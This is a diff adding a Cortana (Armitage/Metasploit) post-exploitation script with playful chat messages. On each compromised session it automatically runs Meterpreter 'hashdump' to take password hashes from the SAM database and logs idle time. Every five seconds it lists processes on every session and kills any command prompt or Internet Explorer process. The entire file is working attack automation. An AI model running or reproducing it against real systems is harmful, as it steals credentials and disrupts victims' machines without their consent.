@@ -1,0 +1,53 @@
+debug(7);
+
+#This Cortana script displays the idletime and pwd hashes of target machine
+#and kills Internet Explorer and command prompt every 5 second
+
+on meterpreter_idletime {
+	say("$3");
+}
+
+on meterpreter_hashdump {
+	say("$3");
+}
+
+on session_open {
+	say("I solemnly swear that I'm up to no good for " . session_host($1));
+	println("Session $1 opened. I got " . session_host($1) . " with " . session_exploit($1));
+}
+
+on session_sync {
+		
+	say("I infiltrated SAM and retrieved hashes");
+	m_cmd($1, "hashdump");
+	m_cmd($1, "idletime");
+}
+
+on meterpreter_ps {
+	local('@processes $process $name $pid');
+	@processes = parse_ps($3);
+	foreach $process (@processes) {
+		($name, $pid) = values($process, @('Name', 'PID'));
+		if ("*cmd*" iswm lc($name)) {
+			m_cmd($1, "kill $pid");
+			say("Oooh a command prompt magically disappeared");
+		}
+		if ("*iexplore*" iswm lc($name)) {
+			m_cmd($1, "kill $pid");
+			say("Internet Explorer died. Chrome lives.");
+		}
+	}
+}
+
+on heartbeat_5s {
+	local('$sid');
+	foreach $sid (session_ids()){
+		m_cmd($sid, "ps");
+	}	
+}
+
+
+
+
+
+
